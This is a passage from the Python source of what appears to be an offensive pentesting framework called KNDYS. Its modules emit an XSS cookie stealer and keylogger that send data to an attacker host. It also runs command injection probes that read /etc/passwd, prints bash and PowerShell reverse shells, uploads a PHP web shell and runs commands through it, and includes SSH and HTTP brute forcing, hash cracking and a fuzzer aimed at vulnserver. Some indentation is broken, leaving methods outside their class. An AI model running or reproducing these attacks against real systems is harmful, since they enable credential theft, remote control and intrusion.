        print(f"\n{Fore.CYAN}[*] Error-based exploitation completed{Style.RESET_ALL}")
    
    def run_xss_exploit(self):
        """XSS exploitation with cookie stealing"""
        url = self.module_options['url']
        payload_type = self.module_options.get('payload', 'xss_cookie_stealer')
        
        print(f"{Fore.CYAN}[*] Generating XSS exploitation payload{Style.RESET_ALL}")
        
        if payload_type == 'xss_cookie_stealer':
            # Generate cookie stealer payload
            server_url = self.module_options.get('server', f"http://{self.config['lhost']}:8080")
            payload = f"""<script>document.location='{server_url}/steal?cookie='+document.cookie</script>"""
            
            print(f"{Fore.GREEN}[+] XSS Cookie Stealer Payload:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}\n")
            
            print(f"{Fore.YELLOW}[*] To capture cookies, start a web server:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    python3 -m http.server 8080{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Or use the built-in server:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    use post/credential_harvester{Style.RESET_ALL}")
        
        elif payload_type == 'xss_keylogger':
            # Generate keylogger payload
            server_url = self.module_options.get('server', f"http://{self.config['lhost']}:8080")
            payload = f"""
<script>
var keys = '';
document.onkeypress = function(e) {{
    keys += String.fromCharCode(e.keyCode);
    if(keys.length > 100) {{
        new Image().src = '{server_url}/log?keys=' + keys;
        keys = '';
    }}
}};
setInterval(function() {{
    if(keys.length > 0) {{
        new Image().src = '{server_url}/log?keys=' + keys;
        keys = '';
    }}
}}, 5000);
</script>
            """.strip()
            
            print(f"{Fore.GREEN}[+] XSS Keylogger Payload:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}\n")
        
        else:
            print(f"{Fore.RED}[!] Unknown payload type: {payload_type}{Style.RESET_ALL}")
    
    def run_command_injection(self):
        """Command injection exploitation"""
        url = self.module_options['url']
        parameter = self.module_options.get('parameter', 'cmd')
        target_os = self.module_options.get('os', 'linux')
        
        print(f"{Fore.CYAN}[*] Testing command injection on {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Parameter: {parameter}, OS: {target_os}{Style.RESET_ALL}\n")
        
        # Test payloads based on OS
        if target_os == 'linux':
            payloads = [
                f"; whoami",
                f"| id",
                f"`whoami`",
                f"$(whoami)",
                f"|| whoami",
                f"&& whoami",
                f"; ls -la",
                f"; cat /etc/passwd",
                f"; uname -a",
                f"; ifconfig",
                f"; ping -c 1 127.0.0.1"
            ]
        else:  # windows
            payloads = [
                f"& whoami",
                f"| whoami",
                f"&& whoami",
                f"|| whoami",
                f"`whoami`",
                f"^ whoami",
                f"; whoami",
                f"& dir",
                f"& ipconfig",
                f"& ping -n 1 127.0.0.1"
            ]
        
        successful = []
        
        for payload in payloads:
            try:
                # Test the payload
                test_data = {parameter: payload}
                headers = {'User-Agent': self.config['user_agent']}
                
                if '?' in url:
                    # GET request
                    response = requests.get(url, params=test_data, headers=headers, timeout=10, verify=False)
                else:
                    # POST request
                    response = requests.post(url, data=test_data, headers=headers, timeout=10, verify=False)
                
                # Check for command output
                output_indicators = ['uid=', 'gid=', 'root:', 'admin', 'inet', 
                                   'Windows IP', 'Volume in drive', 'Directory of']
                
                for indicator in output_indicators:
                    if indicator in response.text:
                        successful.append(payload)
                        print(f"{Fore.GREEN}[+] Command injection successful: {payload}{Style.RESET_ALL}")
                        print(f"    Output contains: {indicator}")
                        break
                        
            except Exception as e:
                print(f"{Fore.RED}[-] Error with payload {payload}: {str(e)[:50]}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Command injection test completed{Style.RESET_ALL}")
        if successful:
            print(f"{Fore.GREEN}[+] Found {len(successful)} working payloads{Style.RESET_ALL}")
            
            # Generate reverse shell payload
            print(f"\n{Fore.YELLOW}[*] Reverse shell payloads:{Style.RESET_ALL}")
            if target_os == 'linux':
                rev_shell = f"bash -c 'bash -i >& /dev/tcp/{self.config['lhost']}/4444 0>&1'"
                print(f"{Fore.CYAN}    {rev_shell}{Style.RESET_ALL}")
            else:
                rev_shell = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{self.config['lhost']}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
                print(f"{Fore.CYAN}    {rev_shell[:100]}...{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] No command injection vulnerabilities found{Style.RESET_ALL}")
    
    def run_file_upload(self):
        """File upload vulnerability exploitation"""
        url = self.module_options['url']
        parameter = self.module_options.get('parameter', 'file')
        shell_type = self.module_options.get('shell', 'php')
        
        print(f"{Fore.CYAN}[*] Testing file upload vulnerability: {url}{Style.RESET_ALL}")
        
        # Generate malicious file based on shell type
        if shell_type == 'php':
            filename = 'shell.php'
            content = '<?php system($_GET["cmd"]); ?>'
        elif shell_type == 'asp':
            filename = 'shell.asp'
            content = '<% Response.Write("ASP Shell") %>'
        else:
            filename = 'shell.txt'
            content = 'Test file upload'
        
        # Test file upload
        try:
            files = {parameter: (filename, content, 'text/plain')}
            headers = {'User-Agent': self.config['user_agent']}
            
            response = requests.post(url, files=files, headers=headers, timeout=10, verify=False)
            
            if response.status_code in [200, 201, 202]:
                print(f"{Fore.GREEN}[+] File upload successful (Status: {response.status_code}){Style.RESET_ALL}")
                
                # Try to find uploaded file location
                upload_patterns = [
                    r'upload.*success',
                    r'file.*uploaded',
                    r'location.*\/([^"\']+)',
                    r'href.*\/([^"\']+)'
                ]
                
                for pattern in upload_patterns:
                    matches = re.search(pattern, response.text, re.IGNORECASE)
                    if matches:
                        print(f"{Fore.YELLOW}[*] Possible file location pattern found{Style.RESET_ALL}")
                        break
                
                # Test common upload directories
                common_dirs = [
                    'uploads/', 'upload/', 'files/', 'images/',
                    'assets/', 'tmp/', 'temp/', 'public/', 'media/'
                ]
                
                base_url = url.rsplit('/', 1)[0] if '/' in url else url
                
                for directory in common_dirs:
                    test_url = f"{base_url}/{directory}{filename}"
                    try:
                        test_resp = requests.get(test_url, headers=headers, timeout=5, verify=False)
                        if test_resp.status_code == 200:
                            print(f"{Fore.GREEN}[+] File accessible at: {test_url}{Style.RESET_ALL}")
                            
                            # Test command execution
                            if shell_type == 'php':
                                cmd_url = f"{test_url}?cmd=whoami"
                                cmd_resp = requests.get(cmd_url, headers=headers, timeout=5, verify=False)
                                if 'uid=' in cmd_resp.text or 'www-data' in cmd_resp.text:
                                    print(f"{Fore.GREEN}[+] Command execution confirmed!{Style.RESET_ALL}")
                                    print(f"{Fore.CYAN}    Access shell: {test_url}?cmd=id{Style.RESET_ALL}")
                            break
                    except:
                        continue
                        
        except Exception as e:
            print(f"{Fore.RED}[-] Upload error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] File upload test completed{Style.RESET_ALL}")
    
    def run_buffer_overflow(self):
        """Buffer overflow testing framework"""
        target = self.module_options['target']
        
        print(f"{Fore.CYAN}[*] Buffer overflow testing: {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] WARNING: This is a basic buffer overflow tester{Style.RESET_ALL}\n")
        
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 9999  # Default vulnserver port
        
        # Test patterns
        patterns = [
            'A' * 100,
            'A' * 500,
            'A' * 1000,
            'A' * 2000,
            'A' * 5000
        ]
        
        for pattern in patterns:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                # Send pattern
                sock.send(f"TRUN /.:/{pattern}\r\n".encode())
                
                # Receive response
                try:
                    response = sock.recv(1024)
                    print(f"{Fore.BLUE}[*] Sent {len(pattern)} bytes - Response: {response.decode('utf-8', errors='ignore')[:50]}{Style.RESET_ALL}")
                except:
                    print(f"{Fore.GREEN}[+] Possible crash with {len(pattern)} bytes (no response){Style.RESET_ALL}")
                
                sock.close()
                time.sleep(1)
                
            except Exception as e:
                print(f"{Fore.RED}[-] Error with {len(pattern)} bytes: {str(e)}{Style.RESET_ALL}")
                break
        
        print(f"\n{Fore.CYAN}[*] Buffer overflow test completed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] For advanced exploitation, use pattern_create and pattern_offset tools{Style.RESET_ALL}")
    
    # ============ PASSWORD ATTACK MODULES ============
    
    def run_brute_force(self):
        """Password brute force attacks"""
        target = self.module_options['target']
        username = self.module_options.get('username', 'admin')
        wordlist_file = self.module_options.get('wordlist', 'passwords.txt')
        service = self.module_options.get('service', 'ssh')
        
        print(f"{Fore.CYAN}[*] Starting brute force attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Service: {service}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Username: {username}{Style.RESET_ALL}\n")
        
        # Load wordlist
        passwords = self.wordlists['passwords']
        if wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load wordlist, using built-in{Style.RESET_ALL}")
        
        found = False
        
        if service == 'ssh' and SSH_AVAILABLE:
            # SSH brute force
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 22
            
            print(f"{Fore.BLUE}[*] Testing SSH credentials...{Style.RESET_ALL}")
            
            for password in passwords[:50]:  # Limit to 50 for demo
                print(f"{Fore.BLUE}[*] Trying: {username}:{password}{Style.RESET_ALL}")
                
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=port, username=username, password=password, timeout=5)
                    
                    print(f"\n{Fore.GREEN}[+] SUCCESS! Password found: {password}{Style.RESET_ALL}")
                    found = True
                    
                    # Execute test command
                    stdin, stdout, stderr = ssh.exec_command('whoami')
                    output = stdout.read().decode().strip()
                    print(f"{Fore.YELLOW}[*] Command output: {output}{Style.RESET_ALL}")
                    
                    ssh.close()
                    break
                    
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
                    continue
        
        elif service == 'http':
            # HTTP form brute force
            print(f"{Fore.BLUE}[*] Testing HTTP login form...{Style.RESET_ALL}")
            
            for password in passwords[:50]:  # Limit to 50 for demo
                print(f"{Fore.BLUE}[*] Trying: {username}:{password}{Style.RESET_ALL}")
                
                try:
                    # This is a generic example - you'll need to customize for the target
                    login_data = {
                        'username': username,
                        'password': password,
                        'submit': 'Login'
                    }
                    
                    headers = {'User-Agent': self.config['user_agent']}
                    response = requests.post(target, data=login_data, headers=headers, timeout=10, verify=False)
                    
                    # Check for success indicators
                    success_indicators = ['welcome', 'dashboard', 'logout', 'success']
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        print(f"\n{Fore.GREEN}[+] SUCCESS! Password found: {password}{Style.RESET_ALL}")
                        found = True
                        break
                        
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
                    continue
        
        else:
            print(f"{Fore.RED}[!] Service {service} not supported{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}[*] Brute force attack completed{Style.RESET_ALL}")
        if not found:
            print(f"{Fore.YELLOW}[*] No valid password found{Style.RESET_ALL}")
    
    def run_hash_cracker(self):
        """Advanced hash cracking"""
        target_hash = self.module_options['hash']
        hash_type = self.module_options.get('type', 'md5').lower()
        wordlist_file = self.module_options.get('wordlist', '')
        
        print(f"{Fore.CYAN}[*] Attempting to crack hash{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Hash: {target_hash}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Type: {hash_type}{Style.RESET_ALL}\n")
        
        # Load wordlist
        passwords = self.wordlists['passwords']
        if wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load wordlist, using built-in{Style.RESET_ALL}")
        
        # Hash functions
        hash_functions = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512,
            'ntlm': lambda x: hashlib.new('md4', x.encode('utf-16le')).hexdigest()
        }
        
        if hash_type not in hash_functions:
            print(f"{Fore.RED}[!] Unsupported hash type: {hash_type}{Style.RESET_ALL}")
            return
        
        hash_func = hash_functions[hash_type]
        
        # Try to crack
        print(f"{Fore.BLUE}[*] Testing {len(passwords)} passwords...{Style.RESET_ALL}")
        
        for password in passwords:
            try:
                if hash_type == 'ntlm':
                    hashed = hash_func(password)
                else:
                    hashed = hash_func(password.encode()).hexdigest()
                
                if hashed == target_hash.lower():
                    print(f"\n{Fore.GREEN}[+] HASH CRACKED!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")
                    self.logger.log(f"Hash cracked: {target_hash} -> {password}", "SUCCESS")
                    return
                    
            except Exception as e:
                print(f"{Fore.RED}[-] Error hashing: {str(e)}{Style.RESET_ALL}")
                continue
        
        print(f"\n{Fore.YELLOW}[*] Hash not found in wordlist{Style.RESET_ALL}")
        
        # Try brute force for simple patterns
        print(f"{Fore.BLUE}[*] Trying simple brute force...{Style.RESET_ALL}")
        
        # Common patterns
        patterns = [
            # Numeric patterns
            *[str(i) for i in range(100000)][:1000],
            # Date patterns
            *[f"{d:02d}{m:02d}{y}" for y in range(1990, 2025) for m in range(1, 13) for d in range(1, 32)][:1000],
            # Common words with numbers
            *[f"password{i}" for i in range(100)],
            *[f"admin{i}" for i in range(100)],
        ]
        
        for pattern in patterns[:2000]:  # Limit attempts
            try:
                if hash_type == 'ntlm':
                    hashed = hash_func(pattern)
                else:
                    hashed = hash_func(pattern.encode()).hexdigest()
                
                if hashed == target_hash.lower():
                    print(f"\n{Fore.GREEN}[+] HASH CRACKED WITH BRUTE FORCE!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Password: {pattern}{Style.RESET_ALL}")
                    return
            except:
                continue
        
        print(f"\n{Fore.YELLOW}[*] Could not crack hash{Style.RESET_ALL}")
    
    def run_spray_attack(self):
        """Password spray attack"""
        target = self.module_options['target']
        usernames_file = self.module_options.get('usernames', 'users.txt')
        passwords_file = self.module_options.get('passwords', 'passwords.txt')
        delay = int(self.module_options.get('delay', 10))
        
        print(f"{Fore.CYAN}[*] Starting password spray attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {target}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Delay between attempts: {delay}s{Style.RESET_ALL}\n")
        
        # Load usernames
        usernames = self.wordlists['usernames']
        if usernames_file and os.path.exists(usernames_file):
            try:
                with open(usernames_file, 'r', encoding='utf-8') as f:
                    usernames = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load usernames file, using built-in{Style.RESET_ALL}")
        
        # Load passwords
        passwords = self.wordlists['passwords']
        if passwords_file and os.path.exists(passwords_file):
            try:
                with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except:
                print(f"{Fore.YELLOW}[!] Could not load passwords file, using built-in{Style.RESET_ALL}")
        
        found = []
        
        # Test each password against all users
        for password in passwords[:10]:  # Limit to 10 passwords for demo
            print(f"{Fore.BLUE}[*] Spraying password: {password}{Style.RESET_ALL}")
            
            for username in usernames[:20]:  # Limit to 20 users for demo
                print(f"  Testing: {username}:{password}")
                
                # Simulate attack (actual implementation depends on service)
                # This is a placeholder - you would implement actual authentication here
                time.sleep(0.1)
                
                # Random success for demo
                if random.random() < 0.01:  # 1% chance for demo
                    found.append((username, password))
                    print(f"{Fore.GREEN}[+] Valid credentials: {username}:{password}{Style.RESET_ALL}")
            
            print(f"{Fore.YELLOW}[*] Waiting {delay} seconds before next password...{Style.RESET_ALL}")
            time.sleep(delay)
        
        print(f"\n{Fore.CYAN}[*] Password spray completed{Style.RESET_ALL}")
        if found:
            print(f"{Fore.GREEN}[+] Found {len(found)} valid credentials:{Style.RESET_ALL}")
            for username, password in found:
                print(f"  {username}:{password}")
        else:
            print(f"{Fore.YELLOW}[*] No valid credentials found{Style.RESET_ALL}")
    
    # ============ TOOLS ============
    
    def run_report_generator(self):
        """Generate professional pentest report"""
        report_format = self.module_options.get('format', 'html')
        template = self.module_options.get('template', 'default')
        output = self.module_options.get('output', 'pentest_report')
        
        print(f"{Fore.CYAN}[*] Generating pentest report{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Format: {report_format}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Template: {template}{Style.RESET_ALL}\n")
        
        # Sample data for report
        findings = [
            {
                'title': 'SQL Injection Vulnerability',
                'severity': 'High',
                'description': 'SQL injection found in login form',
                'impact': 'Complete database compromise',
                'remediation': 'Use parameterized queries'
            },
            {
                'title': 'Weak Password Policy',
                'severity': 'Medium',
                'description': 'No password complexity requirements',
                'impact': 'Increased risk of account takeover',
                'remediation': 'Implement strong password policy'
            },
            {
                'title': 'Missing Security Headers',
                'severity': 'Low',
                'description': 'Missing X-Frame-Options and CSP headers',
                'impact': 'Increased risk of clickjacking',
                'remediation': 'Add security headers'
            }
        ]
        
        if report_format == 'html':
            # Generate HTML report
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report - {datetime.now().strftime('%Y-%m-%d')}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .header {{ background-color: #2c3e50; color: white; padding: 20px; }}
        .finding {{ border: 1px solid #ddd; margin: 10px 0; padding: 15px; }}
        .high {{ border-left: 5px solid #e74c3c; }}
        .medium {{ border-left: 5px solid #f39c12; }}
        .low {{ border-left: 5px solid #3498db; }}
        .severity {{ font-weight: bold; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Penetration Test Report</h1>
        <p>Generated by KNDYS Framework on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
    
    <h2>Executive Summary</h2>
    <p>This report summarizes the findings from the penetration test conducted on the target systems.</p>
    
    <h2>Findings</h2>
"""
            
            for finding in findings:
                html_content += f"""
    <div class="finding {finding['severity'].lower()}">
        <h3>{finding['title']}</h3>
        <p class="severity">Severity: {finding['severity']}</p>
        <p><strong>Description:</strong> {finding['description']}</p>
        <p><strong>Impact:</strong> {finding['impact']}</p>
        <p><strong>Remediation:</strong> {finding['remediation']}</p>
    </div>
"""
            
            html_content += """
    <h2>Recommendations</h2>
    <ul>
        <li>Address all high severity findings immediately</li>
        <li>Implement regular security assessments</li>
        <li>Establish incident response procedures</li>
    </ul>
</body>
</html>
"""
            
            output_file = f"{output}.html"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print(f"{Fore.GREEN}[+] HTML report generated: {output_file}{Style.RESET_ALL}")
        
        elif report_format == 'txt':
            # Generate text report
            txt_content = f"""
PENETRATION TEST REPORT
========================
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Tool: KNDYS Framework

FINDINGS
========
"""
            
            for finding in findings:
                txt_content += f"""
[{finding['severity'].upper()}] {finding['title']}
Description: {finding['description']}
Impact: {finding['impact']}
Remediation: {finding['remediation']}
"""
            
            output_file = f"{output}.txt"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(txt_content)
            
            print(f"{Fore.GREEN}[+] Text report generated: {output_file}{Style.RESET_ALL}")
        
        else:
            print(f"{Fore.RED}[!] Unsupported report format: {report_format}{Style.RESET_ALL}")
    
    # ============ UTILITY FUNCTIONS ============
    
    def show_help(self):
        """Display help"""
        help_text = f"""
{Fore.CYAN}{Style.BRIGHT}[ KNDYS FRAMEWORK HELP ]{Style.RESET_ALL}

{Fore.YELLOW}CORE COMMANDS:{Style.RESET_ALL}
    help                    - Show this help
    show modules           - List all available modules
    show modules <category>- List modules in category
    use <module>           - Select a module
    set <option> <value>   - Set module option
    options                - Show current module options
    run                    - Execute current module
    back                   - Return to main menu
    clear                  - Clear screen
    exit                   - Exit framework
    
{Fore.YELLOW}MODULE MANAGEMENT:{Style.RESET_ALL}
    search exploits <query>- Search for exploits
    show payloads          - Show available payloads
    generate payload       - Generate payload
    show sessions          - Show active sessions
    sessions -i <id>       - Interact with session
    
{Fore.YELLOW}CONFIGURATION:{Style.RESET_ALL}
    setg <option> <value>  - Set global option
    show options           - Show global options
    save config            - Save configuration
    
{Fore.YELLOW}MODULE CATEGORIES:{Style.RESET_ALL}
    recon                  - Reconnaissance tools
    scan                   - Vulnerability scanners
    exploit                - Exploitation modules
    post                   - Post-exploitation tools
    password               - Password attacks
    wireless               - Wireless attacks
    social                 - Social engineering
    report                 - Reporting tools
    
{Fore.YELLOW}EXAMPLES:{Style.RESET_ALL}
    show modules recon
    use recon/port_scanner
    set target 192.168.1.1
    set ports 1-1000
    run
    
    use exploit/multi_handler
    set lhost 192.168.1.100
    set lport 4444
    run
    
    use password/brute_force
    set target ssh://192.168.1.1:22
    set username admin
    run
"""
        print(help_text)
    
    def search_exploits(self, query):
        """Search exploit database"""
        print(f"{Fore.CYAN}[*] Searching exploits for: {query}{Style.RESET_ALL}")
        
        results = self.exploit_db.search_exploits(query)
        
        if results:
            print(f"{Fore.GREEN}[+] Found {len(results)} exploits:{Style.RESET_ALL}")
            for exploit in results:
                print(f"\n{Fore.YELLOW}[{exploit['id']}] {exploit['name']}{Style.RESET_ALL}")
                print(f"  Type: {exploit['type']}")
                print(f"  Port: {exploit['port']}")
                print(f"  Description: {exploit['description']}")
        else:
            print(f"{Fore.YELLOW}[*] No exploits found for: {query}{Style.RESET_ALL}")
    
    def show_payloads(self):
        """Show available payloads"""
        print(f"{Fore.CYAN}{Style.BRIGHT}[ AVAILABLE PAYLOADS ]{Style.RESET_ALL}\n")
        
        for category, payloads in self.payload_gen.payloads.items():
            print(f"{Fore.YELLOW}{category.upper()}:{Style.RESET_ALL}")
            for payload_type in payloads.keys():
                print(f"  {Fore.GREEN}{payload_type}{Style.RESET_ALL}")
            print()
    
def generate_payload(self):
    """Generate payload interactively"""
    print(f"{Fore.CYAN}[*] Payload Generator{Style.RESET_ALL}")
    
    payload_type = input(f"{Fore.YELLOW}Payload type (reverse_shell/bind_shell/web_shell): {Style.RESET_ALL}").strip()
    platform = input(f"{Fore.YELLOW}Platform (bash/python/php/powershell): {Style.RESET_ALL}").strip()
    
    if payload_type == 'reverse_shell':
        lhost = input(f"{Fore.YELLOW}LHOST [{self.config['lhost']}]: {Style.RESET_ALL}").strip() or self.config['lhost']
        lport = input(f"{Fore.YELLOW}LPORT [4444]: {Style.RESET_ALL}").strip() or '4444'
        
        payload = self.payload_gen.generate(payload_type, platform, LHOST=lhost, LPORT=lport)
        
    elif payload_type == 'bind_shell':
        lport = input(f"{Fore.YELLOW}LPORT [4444]: {Style.RESET_ALL}").strip() or '4444'
        payload = self.payload_gen.generate(payload_type, platform, LPORT=lport)
        
    else:
        payload = self.payload_gen.generate(payload_type, platform)

    if payload:
        print(f"\n{Fore.GREEN}[+] Generated payload:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}")

        # Save to file
        save = input(f"\n{Fore.YELLOW}Save to file? (y/n): {Style.RESET_ALL}").strip().lower()
        if save == 'y':
            filename = input(f"{Fore.YELLOW}Filename [payload.txt]: {Style.RESET_ALL}").strip() or 'payload.txt'
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(payload)
            print(f"{Fore.GREEN}[+] Payload saved to: {filename}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[!] Failed to generate payload{Style.RESET_ALL}")
    
    def run(self):
        """Main framework loop"""
        self.display_banner()
        
        while True:
            try:
                # Build prompt
                if self.current_module:
                    prompt = f"{Fore.RED}kndys{Fore.CYAN}({self.current_module}){Fore.RED}>{Style.RESET_ALL} "
                else:
                    prompt = f"{Fore.RED}kndys>{Style.RESET_ALL} "
                
                try:
                    cmd = input(prompt).strip()
                except EOFError:
                    print()
                    break
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                args = parts[1:]
                
                if command in ['exit', 'quit']:
                    print(f"{Fore.YELLOW}[*] Goodbye!{Style.RESET_ALL}")
                    break
                
                elif command == 'help':
                    self.show_help()
                
                elif command == 'show':
                    if args and args[0] == 'modules':
                        category = args[1] if len(args) > 1 else None
                        self.show_modules(category)
                    elif args and args[0] == 'payloads':
                        self.show_payloads()
                    elif args and args[0] == 'options':
                        self.show_options()
                    else:
                        print(f"{Fore.RED}[!] Usage: show modules|payloads|options{Style.RESET_ALL}")
                
                elif command == 'use':
                    if args:
                        self.use_module(args[0])
                    else:
                        print(f"{Fore.RED}[!] Usage: use <module_path>{Style.RESET_ALL}")
                
                elif command == 'set':
                    if len(args) >= 2:
                        self.set_option(args[0], ' '.join(args[1:]))
                    else:
                        print(f"{Fore.RED}[!] Usage: set <option> <value>{Style.RESET_ALL}")
                
                elif command == 'setg':
                    if len(args) >= 2:
                        key = args[0]
                        value = ' '.join(args[1:])
                        if key in self.config:
                            self.config[key] = value
                            print(f"{Fore.GREEN}[+] Global {key} => {value}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}[!] Invalid global option: {key}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[!] Usage: setg <option> <value>{Style.RESET_ALL}")
                
                elif command == 'options':
                    self.show_options()
                
                elif command == 'run':
                    self.run_module()
                
                elif command == 'back':
                    self.current_module = None
                    self.module_options = {}
                    print(f"{Fore.YELLOW}[*] Back to main context{Style.RESET_ALL}")
                
                elif command == 'clear':
                    self.display_banner()
                
                elif command == 'search':
                    if args and args[0] == 'exploits':
                        query = ' '.join(args[1:]) if len(args) > 1 else ''
                        self.search_exploits(query)
                    else:
                        print(f"{Fore.RED}[!] Usage: search exploits <query>{Style.RESET_ALL}")
                
                elif command == 'generate':
                    if args and args[0] == 'payload':
                        self.generate_payload()
                    else:
                        print(f"{Fore.RED}[!] Usage: generate payload{Style.RESET_ALL}")
                
                else:
                    print(f"{Fore.RED}[!] Unknown command: {command}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Type 'help' for available commands{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Command interrupted{Style.RESET_ALL}")
                if self.running:
                    self.running = False
                    time.sleep(1)
            
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                import traceback
                traceback.print_exc()

def main():
    """Main entry point"""
    print(f"{Fore.YELLOW}[*] Loading KNDYS Framework v3.0...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Checking dependencies...{Style.RESET_ALL}")
    
    # Check for required dependencies
    missing_deps = []
    
    if not NMAP_AVAILABLE:
        missing_deps.append("python-nmap (optional)")
    if not SCAPY_AVAILABLE:
        missing_deps.append("scapy (optional)")
    if not SSH_AVAILABLE:
        missing_deps.append("paramiko (optional)")
    if not BS4_AVAILABLE:
        missing_deps.append("beautifulsoup4 (optional)")
    
    if missing_deps:
        print(f"{Fore.YELLOW}[!] Missing optional dependencies: {', '.join(missing_deps)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Install with: pip install {' '.join([d.split()[0] for d in missing_deps])}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Continuing with reduced functionality...{Style.RESET_ALL}")
        time.sleep(2)
    
    try:
        framework = KNDYSFramework()
        framework.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Framework terminated{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='KNDYS Pentesting Framework')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    args = parser.parse_args()
    
    main()